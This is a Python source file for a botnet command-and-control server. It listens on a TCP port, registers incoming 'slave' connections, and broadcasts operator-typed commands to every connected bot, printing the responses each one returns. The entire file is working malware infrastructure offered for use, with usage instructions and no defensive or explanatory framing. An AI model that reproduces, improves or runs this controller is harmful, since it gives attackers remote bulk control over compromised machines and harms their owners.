import socket
import sys
import os
import threading
import queue
import time

q = queue.Queue()

SocketThread = []
ClientList = {}

def main():
    if(len(sys.argv) < 3):
        print("[!] Usage:\n [+] python3 " + sys.argv[0] + "<LHOST> <LPORT>\n [+]Eg: python3 " + sys.argv[0] + " 0.0.0.0 8888\n")
    
    else:
        try:
            lHost = sys.argv[1]
            lPort = int(sys.argv[2])
            listener(lHost, lPort, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler with error " + str(ex) + "\n")

def listener(lHost, lPort, q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_addr = (lHost, lPort)
    server.bind(server_addr)
    server.listen(10)
    print("[+] Starting Botnet Listener on tcp://"+lHost+":"+str(lPort) +"\n")

    BotCmdThread = BotCmd(q)
    BotCmdThread.start()
    while True:
        (client, client_addr) = server.accept()
        newThread = BotHandler(client, client_addr, q)
        SocketThread.append(newThread)
        newThread.start()

class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)
        self.q = qv2

    def run(self):
        while True:
            sendCmd = str(input("BotCmd> "))
            if sendCmd == "":
                pass
            elif sendCmd == "exit":
                for i in range(len(SocketThread)):
                    time.sleep(0.1)
                    self.q.put(sendCmd)
                time.sleep(5)
                os._exit(0)
            else:
                print("[+] Sending command: " + sendCmd + " to " + str(len(SocketThread)) + " bots")
                for i in range(len(SocketThread)):
                    time.sleep(1)
                    self.q.put(sendCmd)


class BotHandler(threading.Thread):
    def __init__(self, client, client_addr, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.client_addr = client_addr
        self.ip = client_addr[0]
        self.port = client_addr[1]
        self.q = qv

    def run(self):
        BotName = threading.current_thread().getName()
        print("[+] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: " + BotName)
        ClientList[BotName] = self.client_addr
        while True:
            RecvBotCmd = self.q.get()
            try:
                self.client.send(RecvBotCmd.encode("utf-8"))
                recVal = (self.client.recv(1024)).decode("utf-8")
                print(self.ip + ":" + str(self.port) + " : " + recVal)
                
            except Exception as ex:
                print(str(ex))
                break

if __name__ == "__main__":
    main()
